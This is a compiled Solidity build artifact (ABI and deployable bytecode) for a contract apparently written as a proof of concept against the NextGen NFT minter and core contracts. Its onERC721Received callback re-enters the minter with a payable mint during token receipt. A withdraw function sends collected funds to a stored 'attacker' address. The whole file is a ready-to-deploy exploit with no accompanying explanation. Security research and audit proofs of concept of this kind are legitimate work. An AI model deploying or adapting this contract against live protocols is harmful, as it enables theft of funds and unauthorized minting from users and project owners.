{
  "abi": [
    {
      "inputs": [
        {
          "internalType": "contract MinterContract",
          "name": "_auctionDemo",
          "type": "address"
        },
        {
          "internalType": "contract NextGenCore",
          "name": "_nextGenCore",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "attacker",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "minterContract",
      "outputs": [
        {
          "internalType": "contract MinterContract",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "nextGenCore",
      "outputs": [
        {
          "internalType": "contract NextGenCore",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        },
        {
          "internalType": "bytes",
          "name": "",
          "type": "bytes"
        }
      ],
      "name": "onERC721Received",
      "outputs": [
        {
          "internalType": "bytes4",
          "name": "",
          "type": "bytes4"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "tokenId",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "withdraw",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    }
  ],
  "bytecode": {
    "object": "0x608060405234801561001057600080fd5b506040516106b43803806106b483398101604081905261002f91610088565b600180546001600160a01b039384166001600160a01b03199182161790915560028054929093169181169190911790915560008054909116331790556100c2565b6001600160a01b038116811461008557600080fd5b50565b6000806040838503121561009b57600080fd5b82516100a681610070565b60208401519092506100b781610070565b809150509250929050565b6105e3806100d16000396000f3fe6080604052600436106100595760003560e01c8063150b7a021461006557806317d70f7c146100a35780633ccfd60b146100c757806348eb76ee146100de5780637c4e2f221461011657806392f002331461013657600080fd5b3661006057005b600080fd5b34801561007157600080fd5b506100856100803660046103c5565b610156565b6040516001600160e01b031990911681526020015b60405180910390f35b3480156100af57600080fd5b506100b960035481565b60405190815260200161009a565b3480156100d357600080fd5b506100dc6102bb565b005b3480156100ea57600080fd5b506000546100fe906001600160a01b031681565b6040516001600160a01b03909116815260200161009a565b34801561012257600080fd5b506002546100fe906001600160a01b031681565b34801561014257600080fd5b506001546100fe906001600160a01b031681565b600254604051632e48eba560e11b815260016004820152600091829182916001600160a01b031690635c91d74a9060240160c060405180830381865afa1580156101a4573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906101c891906104a5565b50509350935050508082036101e95750630a85bd0160e11b91506102b39050565b604080516001808252818301909252600091602080830190803683370190505090506000801b8160008151811061022257610222610505565b60209081029190910101526001805460405163b047168f60e01b81526001600160a01b039091169163b047168f91670de0b6b3a764000091610273918190600090309089908390819060040161051b565b6000604051808303818588803b15801561028c57600080fd5b505af11580156102a0573d6000803e3d6000fd5b50630a85bd0160e11b9750505050505050505b949350505050565b6000546001600160a01b031633146103065760405162461bcd60e51b8152602060048201526009602482015268536f727279202d5f2d60b81b60448201526064015b60405180910390fd5b600080546040516001600160a01b039091169047908381818185875af1925050503d8060008114610353576040519150601f19603f3d011682016040523d82523d6000602084013e610358565b606091505b50509050806103975760405162461bcd60e51b815260206004820152600b60248201526a10d85b1b0819985a5b195960aa1b60448201526064016102fd565b50565b6001600160a01b038116811461039757600080fd5b634e487b7160e01b600052604160045260246000fd5b600080600080608085870312156103db57600080fd5b84356103e68161039a565b935060208501356103f68161039a565b925060408501359150606085013567ffffffffffffffff8082111561041a57600080fd5b818701915087601f83011261042e57600080fd5b813581811115610440576104406103af565b604051601f8201601f19908116603f01168101908382118183101715610468576104686103af565b816040528281528a602084870101111561048157600080fd5b82602086016020830137600060208483010152809550505050505092959194509250565b60008060008060008060c087890312156104be57600080fd5b86516104c98161039a565b809650506020870151945060408701519350606087015192506080870151915060a08701516104f78161039a565b809150509295509295509295565b634e487b7160e01b600052603260045260246000fd5b8781526020808201889052604082018790526101006060830181905260009083018190526001600160a01b038716608084015261012060a084018190528651908401819052909161014084019187820190845b8181101561058a5782518552938301939183019160010161056e565b505050506001600160a01b039490941660c08301525060e001529594505050505056fea2646970667358221220d5328668644d85da0bf60d8ba930c3d1a4a759eaf0214c01f69ae298e9e57ec364736f6c63430008130033",
    "linkReferences": {}
  },
  "methodIdentifiers": {
    "attacker()": "48eb76ee",
    "minterContract()": "92f00233",
    "nextGenCore()": "7c4e2f22",
    "onERC721Received(address,address,uint256,bytes)": "150b7a02",
    "tokenId()": "17d70f7c",
    "withdraw()": "3ccfd60b"
  },
  "id": 51
}